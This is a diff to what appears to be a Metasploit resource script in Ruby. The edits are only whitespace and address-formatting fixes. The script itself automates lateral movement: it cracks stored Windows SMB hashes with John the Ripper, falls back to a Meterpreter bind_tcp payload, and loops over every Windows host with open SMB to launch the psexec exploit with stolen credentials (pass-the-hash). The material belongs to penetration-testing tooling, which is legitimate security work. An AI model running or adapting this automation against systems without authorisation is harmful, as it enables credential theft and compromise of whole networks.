@@ -9,8 +9,8 @@
 
 <ruby>
 #psexec needs a payload
-if framework.datastore['PAYLOAD'] 
-	pload = framework.datastore['PAYLOAD'] 
+if framework.datastore['PAYLOAD']
+	pload = framework.datastore['PAYLOAD']
 else	#just to get sure that we have a backup payload
 	pload = "windows/meterpreter/bind_tcp"
 end
@@ -43,7 +43,7 @@ end
 def infos(serv,creds,host)
 	print_line("")
 	print_line("====================================")
-	print_line("IP: #{host.address}")
+	print_line("IP: #{host.address.to_s}")
 	print_line("OS: #{host.os_name}")
 	print_line("Servicename: #{serv.name}")
 	print_line("Service Port: #{serv.port.to_i}")
@@ -59,7 +59,7 @@ framework.db.creds.each do |creds|	# just checking if we have any smb_hashes in 
 
 	if (jotr == 1)
 		# first checking weak windows hashes with john ... because of the filtering before, we are sure that
-		# this is a windows hash 
+		# this is a windows hash
 		# on the first found hash we are going to analyse all hashes - then we set jotr to 0
 
 		print_line("using jtr_crack_fast")
@@ -74,21 +74,21 @@ framework.db.creds.each do |creds|	# just checking if we have any smb_hashes in 
 
 	smbhash = creds.pass
 	username = creds.user
-	
+
 	framework.db.hosts.each do |host|
 		next if (host.os_name !~ /Windows/)		# pass the hash works just for Win
 
 		host.services.each do |serv|
 			next if not serv.host
 			next if (serv.state != Msf::ServiceState::Open)
-			next if (serv.name !~ /smb/) 
+			next if (serv.name !~ /smb/)
 
 			print_line("using psexec - Pass the hash")
 			if(verbose == 1)
 				infos(serv,creds,host)
 			end
 			run_single("use exploit/windows/smb/psexec")
-			run_single("set RHOST #{host.address}")
+			run_single("set RHOST #{host.address.to_s}")
 			run_single("set RPORT #{serv.port}")
 			run_single("set SMBUser #{username}")
 			run_single("set SMBPass #{smbhash}")
